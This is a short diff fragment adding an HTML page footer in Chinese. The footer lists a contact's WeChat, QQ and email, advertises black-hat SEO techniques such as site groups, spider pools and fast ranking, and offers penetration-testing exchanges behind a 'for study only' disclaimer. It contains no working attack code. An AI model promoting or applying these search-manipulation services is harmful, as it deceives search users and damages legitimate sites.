+      <p>微信：yanyuseo ｜ QQ：81047380 ｜ 邮箱：<a href="mailto:yanyuseo@gmail.com">yanyuseo@gmail.com</a></p>
+      <p>专注搜索引擎优化（SEO）与黑帽SEO技术研究，涵盖整站优化、站群、蜘蛛池、泛目录、快排与流量变现等实战方向，并提供 Web 渗透测试、内网渗透、代码审计等网络安全技术交流。</p>
+      <p class="muted">本站内容仅供安全学习与技术研究，请勿用于非法用途。</p>
+    </footer>
+  </main>
+</div>
+<script src="../assets/app.js?v=1"></script>
+</body>
+</html>
